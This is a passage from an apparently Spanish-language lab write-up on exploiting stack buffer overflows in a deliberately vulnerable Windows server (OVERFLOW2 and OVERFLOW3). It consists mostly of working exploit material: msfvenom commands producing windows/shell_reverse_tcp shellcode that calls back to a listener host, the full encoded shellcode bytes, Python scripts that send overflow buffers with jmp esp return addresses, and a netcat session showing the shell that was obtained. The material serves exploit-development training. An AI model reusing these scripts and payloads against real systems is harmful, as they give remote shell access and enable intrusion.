x86/shikata_ga_nai x86/shikata_ga_nai failed with A valid opcode permutation could not be found. Attempting to encode payload with 1 iterations of generic/none generic/none failed with Encoding failed due to a bad character (index=3, char=0x00) Attempting to encode payload with 1 iterations of x86/call4_dword_xor x86/call4_dword_xor failed with Encoding failed due to a bad character (index=21, char=0x83) Attempting to encode payload with 1 iterations of x86/countdown x86/countdown failed with Encoding failed due to a bad character (index=112, char=0x23) Attempting to encode payload with 1 iterations of x86/fnstenv_mov x86/fnstenv_mov failed with Encoding failed due to a bad character (index=17, char=0x83) Attempting to encode payload with 1 iterations of x86/jmp_call_additive x86/jmp_call_additive succeeded with size 353 (iteration=0) x86/jmp_call_additive chosen with final size 353 Payload size: 353 bytes Final size of c file: 1508 bytes unsigned char buf[] = \u0026#34;\\xfc\\xbb\\x2d\\x12\\x80\\x28\\xeb\\x0c\\x5e\\x56\\x31\\x1e\\xad\\x01\\xc3\u0026#34; \u0026#34;\\x85\\xc0\\x75\\xf7\\xc3\\xe8\\xef\\xff\\xff\\xff\\xd1\\xfa\\x02\\x28\\x29\u0026#34; \u0026#34;\\xfb\\x62\\xa0\\xcc\\xca\\xa2\\xd6\\x85\\x7d\\x13\\x9c\\xcb\\x71\\xd8\\xf0\u0026#34; \u0026#34;\\xff\\x02\\xac\\xdc\\xf0\\xa3\\x1b\\x3b\\x3f\\x33\\x37\\x7f\\x5e\\xb7\\x4a\u0026#34; \u0026#34;\\xac\\x80\\x86\\x84\\xa1\\xc1\\xcf\\xf9\\x48\\x93\\x98\\x76\\xfe\\x03\\xac\u0026#34; \u0026#34;\\xc3\\xc3\\xa8\\xfe\\xc2\\x43\\x4d\\xb6\\xe5\\x62\\xc0\\xcc\\xbf\\xa4\\xe3\u0026#34; \u0026#34;\\x01\\xb4\\xec\\xfb\\x46\\xf1\\xa7\\x70\\xbc\\x8d\\x39\\x50\\x8c\\x6e\\x95\u0026#34; \u0026#34;\\x9d\\x20\\x9d\\xe7\\xda\\x87\\x7e\\x92\\x12\\xf4\\x03\\xa5\\xe1\\x86\\xdf\u0026#34; \u0026#34;\\x20\\xf1\\x21\\xab\\x93\\xdd\\xd0\\x78\\x45\\x96\\xdf\\x35\\x01\\xf0\\xc3\u0026#34; \u0026#34;\\xc8\\xc6\\x8b\\xf8\\x41\\xe9\\x5b\\x89\\x12\\xce\\x7f\\xd1\\xc1\\x6f\\x26\u0026#34; \u0026#34;\\xbf\\xa4\\x90\\x38\\x60\\x18\\x35\\x33\\x8d\\x4d\\x44\\x1e\\xda\\xa2\\x65\u0026#34; \u0026#34;\\xa0\\x1a\\xad\\xfe\\xd3\\x28\\x72\\x55\\x7b\\x01\\xfb\\x73\\x7c\\x66\\xd6\u0026#34; \u0026#34;\\xc4\\x12\\x99\\xd9\\x34\\x3b\\x5e\\x8d\\x64\\x53\\x77\\xae\\xee\\xa3\\x78\u0026#34; \u0026#34;\\x7b\\xa0\\xf3\\xd6\\xd4\\x01\\xa3\\x96\\x84\\xe9\\xa9\\x18\\xfa\\x0a\\xd2\u0026#34; \u0026#34;\\xf2\\x93\\xa1\\x29\\x95\\x5b\\x9d\\x27\\x64\\x34\\xdc\\x47\\x63\\xfe\\x69\u0026#34; \u0026#34;\\xa1\\x01\\xee\\x3f\\x7a\\xbe\\x97\\x65\\xf0\\x5f\\x57\\xb0\\x7d\\x5f\\xd3\u0026#34; \u0026#34;\\x37\\x82\\x2e\\x14\\x3d\\x90\\xc7\\xd4\\x08\\xca\\x4e\\xea\\xa6\\x62\\x0c\u0026#34; \u0026#34;\\x79\\x2d\\x72\\x5b\\x62\\xfa\\x25\\x0c\\x54\\xf3\\xa3\\xa0\\xcf\\xad\\xd1\u0026#34; \u0026#34;\\x38\\x89\\x96\\x51\\xe7\\x6a\\x18\\x58\\x6a\\xd6\\x3e\\x4a\\xb2\\xd7\\x7a\u0026#34; \u0026#34;\\x3e\\x6a\\x8e\\xd4\\xe8\\xcc\\x78\\x97\\x42\\x87\\xd7\\x71\\x02\\x5e\\x14\u0026#34; \u0026#34;\\x42\\x54\\x5f\\x71\\x34\\xb8\\xee\\x2c\\x01\\xc7\\xdf\\xb8\\x85\\xb0\\x3d\u0026#34; \u0026#34;\\x59\\x69\\x6b\\x86\\x79\\x88\\xb9\\xf3\\x11\\x15\\x28\\xbe\\x7f\\xa6\\x87\u0026#34; \u0026#34;\\xfd\\x79\\x25\\x2d\\x7e\\x7e\\x35\\x44\\x7b\\x3a\\xf1\\xb5\\xf1\\x53\\x94\u0026#34; \u0026#34;\\xb9\\xa6\\x54\\xbd\\xb9\\x48\\xab\\x3e\u0026#34; Agregamos nuestra shellcode y NOPs, finalmente calculamos el padding para mantener la longitud de nuestro buffer (1150).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 shellcode = (\u0026#34;\\xfc\\xbb\\x2d\\x12\\x80\\x28\\xeb\\x0c\\x5e\\x56\\x31\\x1e\\xad\\x01\\xc3\u0026#34; \u0026#34;\\x85\\xc0\\x75\\xf7\\xc3\\xe8\\xef\\xff\\xff\\xff\\xd1\\xfa\\x02\\x28\\x29\u0026#34; \u0026#34;\\xfb\\x62\\xa0\\xcc\\xca\\xa2\\xd6\\x85\\x7d\\x13\\x9c\\xcb\\x71\\xd8\\xf0\u0026#34; \u0026#34;\\xff\\x02\\xac\\xdc\\xf0\\xa3\\x1b\\x3b\\x3f\\x33\\x37\\x7f\\x5e\\xb7\\x4a\u0026#34; \u0026#34;\\xac\\x80\\x86\\x84\\xa1\\xc1\\xcf\\xf9\\x48\\x93\\x98\\x76\\xfe\\x03\\xac\u0026#34; \u0026#34;\\xc3\\xc3\\xa8\\xfe\\xc2\\x43\\x4d\\xb6\\xe5\\x62\\xc0\\xcc\\xbf\\xa4\\xe3\u0026#34; \u0026#34;\\x01\\xb4\\xec\\xfb\\x46\\xf1\\xa7\\x70\\xbc\\x8d\\x39\\x50\\x8c\\x6e\\x95\u0026#34; \u0026#34;\\x9d\\x20\\x9d\\xe7\\xda\\x87\\x7e\\x92\\x12\\xf4\\x03\\xa5\\xe1\\x86\\xdf\u0026#34; \u0026#34;\\x20\\xf1\\x21\\xab\\x93\\xdd\\xd0\\x78\\x45\\x96\\xdf\\x35\\x01\\xf0\\xc3\u0026#34; \u0026#34;\\xc8\\xc6\\x8b\\xf8\\x41\\xe9\\x5b\\x89\\x12\\xce\\x7f\\xd1\\xc1\\x6f\\x26\u0026#34; \u0026#34;\\xbf\\xa4\\x90\\x38\\x60\\x18\\x35\\x33\\x8d\\x4d\\x44\\x1e\\xda\\xa2\\x65\u0026#34; \u0026#34;\\xa0\\x1a\\xad\\xfe\\xd3\\x28\\x72\\x55\\x7b\\x01\\xfb\\x73\\x7c\\x66\\xd6\u0026#34; \u0026#34;\\xc4\\x12\\x99\\xd9\\x34\\x3b\\x5e\\x8d\\x64\\x53\\x77\\xae\\xee\\xa3\\x78\u0026#34; \u0026#34;\\x7b\\xa0\\xf3\\xd6\\xd4\\x01\\xa3\\x96\\x84\\xe9\\xa9\\x18\\xfa\\x0a\\xd2\u0026#34; \u0026#34;\\xf2\\x93\\xa1\\x29\\x95\\x5b\\x9d\\x27\\x64\\x34\\xdc\\x47\\x63\\xfe\\x69\u0026#34; \u0026#34;\\xa1\\x01\\xee\\x3f\\x7a\\xbe\\x97\\x65\\xf0\\x5f\\x57\\xb0\\x7d\\x5f\\xd3\u0026#34; \u0026#34;\\x37\\x82\\x2e\\x14\\x3d\\x90\\xc7\\xd4\\x08\\xca\\x4e\\xea\\xa6\\x62\\x0c\u0026#34; \u0026#34;\\x79\\x2d\\x72\\x5b\\x62\\xfa\\x25\\x0c\\x54\\xf3\\xa3\\xa0\\xcf\\xad\\xd1\u0026#34; \u0026#34;\\x38\\x89\\x96\\x51\\xe7\\x6a\\x18\\x58\\x6a\\xd6\\x3e\\x4a\\xb2\\xd7\\x7a\u0026#34; \u0026#34;\\x3e\\x6a\\x8e\\xd4\\xe8\\xcc\\x78\\x97\\x42\\x87\\xd7\\x71\\x02\\x5e\\x14\u0026#34; \u0026#34;\\x42\\x54\\x5f\\x71\\x34\\xb8\\xee\\x2c\\x01\\xc7\\xdf\\xb8\\x85\\xb0\\x3d\u0026#34; \u0026#34;\\x59\\x69\\x6b\\x86\\x79\\x88\\xb9\\xf3\\x11\\x15\\x28\\xbe\\x7f\\xa6\\x87\u0026#34; \u0026#34;\\xfd\\x79\\x25\\x2d\\x7e\\x7e\\x35\\x44\\x7b\\x3a\\xf1\\xb5\\xf1\\x53\\x94\u0026#34; \u0026#34;\\xb9\\xa6\\x54\\xbd\\xb9\\x48\\xab\\x3e\u0026#34;) eip_ret = pack(\u0026#34;\u0026lt;L\u0026#34;,0x625011af) nops = \u0026#34;\\x90\u0026#34; * 16 padding = \u0026#34;C\u0026#34; buff = \u0026#34;A\u0026#34; * 634 + eip_ret + nops + shellcode + padding * (1150 - 634 - 4 - 16 - 353) # junk 634, eip_ret 4, nops 16, shellcode 353, padding 143 try: log.info(\u0026#34;Realizando conexion.\u0026#34;) s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) connect = s.connect((address, port)) data = s.recv(1024) s.send(\u0026#34;OVERFLOW2 %s\\r\\n\u0026#34; % buff) s.close() log.info(\u0026#34;Conexion Finalizada.\u0026#34;) except Exception as e: #print(e) log.failure(\u0026#34;Parece que el programa se detuvo.\u0026#34; ) sys.exit(1) Tras la ejecución logramos obtener una shell.\n1 2 3 4 5 6 7 8 9 10 11 ➜ OVERFLOW_2 nc -lnvp 1338 Listening on 0.0.0.0 1338 Connection received on 192.168.22.128 49224 Microsoft Windows [Versin 6.1.7601] Copyright (c) 2009 Microsoft Corporation. Reservados todos los derechos. C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\u0026gt;echo %username% echo %username% sckull C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\u0026gt; Overflow 3 Fuzzing Realizamos fuzzing al segundo reto utilizando esta vez OVERFLOW3.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 #!/usr/bin/python2.7 import socket, sys from pwn import * from struct import pack if len(sys.argv) != 2: print(\u0026#34;[*] Run:\\n\\toscp1.py \u0026lt;IP-address\u0026gt;\u0026#34;) sys.exit(1) address = sys.argv[1] port = 1337 buff = [\u0026#34;A\u0026#34;] c = 100 while len(buff) \u0026lt; 30: buff.append(\u0026#34;A\u0026#34;*c) c += 100 p1 = log.progress(\u0026#34;Progreso\u0026#34;) for string in buff: try: p1.status(\u0026#34;Enviando %s bytes.\u0026#34; % len(string)) s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) connect = s.connect((address, port)) data = s.recv(1024) s.send(\u0026#34;OVERFLOW3 %s\\r\\n\u0026#34; % string) s.close() #log.info(\u0026#34;x_x socket.\u0026#34;) except Exception as e: #print(e) log.failure(\u0026#34;Parece que el programa se detuvo con %s bytes.\u0026#34; % len(string)) sys.exit(1) Encontramos que el programa se detuvo con 1400 bytes.\n1 2 3 4 ➜ OVERFLOW_3 ./overflow3.py 192.168.22.128 [\\] Progreso: Enviando 1400 bytes. [-] Parece que el programa se detuvo con 1400 bytes. ➜ OVERFLOW_3 Observamos que el registro EIP se sobreescribió con \u0026ldquo;A\u0026quot;s, tambien vemos el registro ESP con los mismos valores.\nOffset EIP Creamos un patron de 1600 bytes utilizando pattern_create.rb, modificamos el script para realizar el envio de este.\n1 2 3 ┌──(kali㉿kali)-[/usr/share/metasploit-framework/tools/exploit] └─$ ./pattern_create.rb -l 1600 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2C El registro EIP lleno con el patron enviado asi mismo el registro ESP.\nMona nos muestra el offset con valor de 1274 bytes.\n1 2 3 4 5 6 7 8 !mona findmsp -distance 1600 [+] Looking for cyclic pattern in memory [..] [+] Examining registers EIP contains normal pattern : 0x35714234 (offset 1274) ESP (0x017cfa30) points at offset 1278 in normal pattern (length 322) EBP contains normal pattern : 0x71423371 (offset 1270) EBX contains normal pattern : 0x42327142 (offset 1266) Control EIP Utilizando la longitud del offset agregamos “B\u0026quot;s para confirmar que el offset es exacto y que tenemos el control del registro EIP, además agregamos un padding para mantener la longitud del buffer (1600).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 eip_ret = \u0026#34;B\u0026#34; * 4 nops = \u0026#34;\u0026#34; padding = \u0026#34;C\u0026#34; buff = \u0026#34;A\u0026#34; * 1274 + eip_ret + padding * (1600-1274-4) # junk 1274, eip 4, padding 322 = 1600 try: log.info(\u0026#34;Realizando conexion.\u0026#34;) s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) connect = s.connect((address, port)) data = s.recv(1024) s.send(\u0026#34;OVERFLOW3 %s\\r\\n\u0026#34; % buff) s.close() log.info(\u0026#34;Conexion Finalizada.\u0026#34;) except Exception as e: #print(e) log.failure(\u0026#34;Parece que el programa se detuvo.\u0026#34; ) sys.exit(1) Tras ejecutar el script vemos que el registro EIP contiene “B\u0026quot;s lo que significa que el offset es exacto, además vemos el registro ESP con el padding (\u0026ldquo;C\u0026quot;s).\nEspacio - Shellcode Aumentamos el padding a 150 para tener asegurado un espacio ‘decente’ para nuestro shellcode, en este caso 150 bytes adicionales, en total tendríamos 472 bytes disponibles.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 eip_ret = \u0026#34;B\u0026#34; * 4 nops = \u0026#34;\u0026#34; # 16 bytes padding = \u0026#34;C\u0026#34; buff = \u0026#34;A\u0026#34; * 1274 + eip_ret + nops + padding * (1600-1274 - 4 - 16 + 150) # 472 padding # 1274 junk, 4 eip_ret, padding 472 (shellcode + nops) # total buffer = 1750 try: log.info(\u0026#34;Realizando conexion.\u0026#34;) s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) connect = s.connect((address, port)) data = s.recv(1024) s.send(\u0026#34;OVERFLOW3 %s\\r\\n\u0026#34; % buff) s.close() log.info(\u0026#34;Conexion Finalizada.\u0026#34;) except Exception as e: #print(e) log.failure(\u0026#34;Parece que el programa se detuvo.\u0026#34; ) sys.exit(1) El debugger muestra el mismo comportamiento por lo que tomamos la longitud del buffer en 1750 bytes de los cuales 472 bytes serán para el shellcode y los nops (16 bytes).\nBadChars Generamos con mona un array con todos los badchars exeptuando el valor null (\\x00).\n1 !mona bytearray -cpb \u0026#34;\\x00\u0026#34; Modificamos el script con nuestro array de badchars.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 badchars = (\u0026#34;\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\u0026#34; \u0026#34;\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\u0026#34; \u0026#34;\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\u0026#34; \u0026#34;\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\u0026#34; \u0026#34;\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\u0026#34; \u0026#34;\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\u0026#34; \u0026#34;\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\u0026#34; \u0026#34;\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\u0026#34;) eip_ret = \u0026#34;B\u0026#34; * 4 nops = \u0026#34;\u0026#34; # 16 bytes padding = \u0026#34;C\u0026#34; buff = \u0026#34;A\u0026#34; * 1274 + eip_ret + nops + badchars + padding * (1750 - 1274 - 4 - 255) # 255 badchars try: log.info(\u0026#34;Realizando conexion.\u0026#34;) s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) connect = s.connect((address, port)) data = s.recv(1024) s.send(\u0026#34;OVERFLOW3 %s\\r\\n\u0026#34; % buff) s.close() log.info(\u0026#34;Conexion Finalizada.\u0026#34;) except Exception as e: #print(e) log.failure(\u0026#34;Parece que el programa se detuvo.\u0026#34; ) sys.exit(1) Realizamos la busqueda de badchars como en el primer reto. Inicialmente encontramos los badchars \u0026quot;\\x00\\x01\\x11\\x40\\x5f\\xb8\\xee\u0026quot; pero el valor \\x01 no es uno de ellos tras verificarlo con un nuevo array.\n1 !mona bytearray -cpb \u0026#34;\\x00\\x11\\x40\\x5f\\xb8\\xee\u0026#34; JMP ESP Nuevamente como en el anterior ejercicio buscamos una instrucción de salto al ESP con mona.\n1 2 !mona find -s \u0026#39;jmp esp\u0026#39; -type instr -cm aslr=false,rebase=false,nx=false -cpb \u0026#34;\\x00\\x11\\x40\\x5f\\xb8\\xee\u0026#34; !mona jmp -r esp -cpb \u0026#34;\\x00\\x11\\x40\\x5f\\xb8\\xee\u0026#34; Encontramos dos direcciones de memoria con la instrucción jmp esp sin ningun tipo de protección.\n1 2 3 4 [+] Results : 0x62501203 : \u0026#39;jmp esp\u0026#39; | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) 0x62501205 : \u0026#39;jmp esp\u0026#39; | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\\Users\\sckull\\Desktop\\vulnerable-apps\\oscp\\essfunc.dll) Found a total of 2 pointer Modificamos nuestr script agregando la dirección de la instrucción.\n1 2 3 from struct import pack eip_ret = pack(\u0026#34;\u0026lt;L\u0026#34;,0x62501203) Shellcode Creamos nuestro shellcode pasandole los badchars que encontramos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 ┌──(kali㉿kali)-[/usr/share/metasploit-framework/tools/exploit] └─$ msfvenom -p windows/shell_reverse_tcp EXITFUNC=thread LHOST=192.168.22.1 LPORT=1338 -a x86 --platform windows -f c -b \u0026#34;\\x00\\x11\\x40\\x5f\\xb8\\xee\u0026#34; 130 ⨯ Found 11 compatible encoders Attempting to encode payload with 1 iterations of x86/shikata_ga_nai x86/shikata_ga_nai failed with A valid opcode permutation could not be found. Attempting to encode payload with 1 iterations of generic/none generic/none failed with Encoding failed due to a bad character (index=3, char=0x00) Attempting to encode payload with 1 iterations of x86/call4_dword_xor x86/call4_dword_xor failed with Encoding failed due to a bad character (index=20, char=0xee) Attempting to encode payload with 1 iterations of x86/countdown x86/countdown failed with Encoding failed due to a bad character (index=275, char=0x11) Attempting to encode payload with 1 iterations of x86/fnstenv_mov x86/fnstenv_mov failed with Encoding failed due to a bad character (index=4, char=0xee) Attempting to encode payload with 1 iterations of x86/jmp_call_additive x86/jmp_call_additive succeeded with size 353 (iteration=0) x86/jmp_call_additive chosen with final size 353 Payload size: 353 bytes Final size of c file: 1508 bytes unsigned char buf[] = \u0026#34;\\xfc\\xbb\\x24\\x55\\xde\\xf6\\xeb\\x0c\\x5e\\x56\\x31\\x1e\\xad\\x01\\xc3\u0026#34; \u0026#34;\\x85\\xc0\\x75\\xf7\\xc3\\xe8\\xef\\xff\\xff\\xff\\xd8\\xbd\\x5c\\xf6\\x20\u0026#34; \u0026#34;\\x3e\\x01\\x7e\\xc5\\x0f\\x01\\xe4\\x8e\\x20\\xb1\\x6e\\xc2\\xcc\\x3a\\x22\u0026#34; \u0026#34;\\xf6\\x47\\x4e\\xeb\\xf9\\xe0\\xe5\\xcd\\x34\\xf0\\x56\\x2d\\x57\\x72\\xa5\u0026#34; \u0026#34;\\x62\\xb7\\x4b\\x66\\x77\\xb6\\x8c\\x9b\\x7a\\xea\\x45\\xd7\\x29\\x1a\\xe1\u0026#34; \u0026#34;\\xad\\xf1\\x91\\xb9\\x20\\x72\\x46\\x09\\x42\\x53\\xd9\\x01\\x1d\\x73\\xd8\u0026#34; \u0026#34;\\xc6\\x15\\x3a\\xc2\\x0b\\x13\\xf4\\x79\\xff\\xef\\x07\\xab\\x31\\x0f\\xab\u0026#34; \u0026#34;\\x92\\xfd\\xe2\\xb5\\xd3\\x3a\\x1d\\xc0\\x2d\\x39\\xa0\\xd3\\xea\\x43\\x7e\u0026#34; \u0026#34;\\x51\\xe8\\xe4\\xf5\\xc1\\xd4\\x15\\xd9\\x94\\x9f\\x1a\\x96\\xd3\\xc7\\x3e\u0026#34; \u0026#34;\\x29\\x37\\x7c\\x3a\\xa2\\xb6\\x52\\xca\\xf0\\x9c\\x76\\x96\\xa3\\xbd\\x2f\u0026#34; \u0026#34;\\x72\\x05\\xc1\\x2f\\xdd\\xfa\\x67\\x24\\xf0\\xef\\x15\\x67\\x9d\\xdc\\x17\u0026#34; \u0026#34;\\x97\\x5d\\x4b\\x2f\\xe4\\x6f\\xd4\\x9b\\x62\\xdc\\x9d\\x05\\x75\\x23\\xb4\u0026#34; \u0026#34;\\xf2\\xe9\\xda\\x37\\x03\\x20\\x19\\x63\\x53\\x5a\\x88\\x0c\\x38\\x9a\\x35\u0026#34; \u0026#34;\\xd9\\xef\\xca\\x99\\xb2\\x4f\\xba\\x59\\x63\\x38\\xd0\\x55\\x5c\\x58\\xdb\u0026#34; \u0026#34;\\xbf\\xf5\\xf3\\x26\\x28\\x3a\\xab\\x3e\\xa9\\xd2\\xae\\x3e\\xac\\x18\\x26\u0026#34; \u0026#34;\\xd8\\xc4\\x4c\\x6e\\x73\\x71\\xf4\\x2b\\x0f\\xe0\\xf9\\xe1\\x6a\\x22\\x71\u0026#34; \u0026#34;\\x06\\x8b\\xed\\x72\\x63\\x9f\\x9a\\x72\\x3e\\xfd\\x0d\\x8c\\x94\\x69\\xd1\u0026#34; \u0026#34;\\x1f\\x73\\x69\\x9c\\x03\\x2c\\x3e\\xc9\\xf2\\x25\\xaa\\xe7\\xad\\x9f\\xc8\u0026#34; \u0026#34;\\xf5\\x28\\xe7\\x48\\x22\\x89\\xe6\\x51\\xa7\\xb5\\xcc\\x41\\x71\\x35\\x49\u0026#34; \u0026#34;\\x35\\x2d\\x60\\x07\\xe3\\x8b\\xda\\xe9\\x5d\\x42\\xb0\\xa3\\x09\\x13\\xfa\u0026#34; \u0026#34;\\x73\\x4f\\x1c\\xd7\\x05\\xaf\\xad\\x8e\\x53\\xd0\\x02\\x47\\x54\\xa9\\x7e\u0026#34; \u0026#34;\\xf7\\x9b\\x60\\x3b\\x17\\x7e\\xa0\\x36\\xb0\\x27\\x21\\xfb\\xdd\\xd7\\x9c\u0026#34; \u0026#34;\\x38\\xd8\\x5b\\x14\\xc1\\x1f\\x43\\x5d\\xc4\\x64\\xc3\\x8e\\xb4\\xf5\\xa6\u0026#34; \u0026#34;\\xb0\\x6b\\xf5\\xe2\\xb0\\x8b\\x09\\x0d\u0026#34;; Agregamos nuestro shellcode y NOPs, finalmente calculamos el padding para mantener la longitud de nuestro buffer (1750).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 shellcode = (\u0026#34;\\xfc\\xbb\\x24\\x55\\xde\\xf6\\xeb\\x0c\\x5e\\x56\\x31\\x1e\\xad\\x01\\xc3\u0026#34; \u0026#34;\\x85\\xc0\\x75\\xf7\\xc3\\xe8\\xef\\xff\\xff\\xff\\xd8\\xbd\\x5c\\xf6\\x20\u0026#34; \u0026#34;\\x3e\\x01\\x7e\\xc5\\x0f\\x01\\xe4\\x8e\\x20\\xb1\\x6e\\xc2\\xcc\\x3a\\x22\u0026#34; \u0026#34;\\xf6\\x47\\x4e\\xeb\\xf9\\xe0\\xe5\\xcd\\x34\\xf0\\x56\\x2d\\x57\\x72\\xa5\u0026#34; \u0026#34;\\x62\\xb7\\x4b\\x66\\x77\\xb6\\x8c\\x9b\\x7a\\xea\\x45\\xd7\\x29\\x1a\\xe1\u0026#34; \u0026#34;\\xad\\xf1\\x91\\xb9\\x20\\x72\\x46\\x09\\x42\\x53\\xd9\\x01\\x1d\\x73\\xd8\u0026#34; 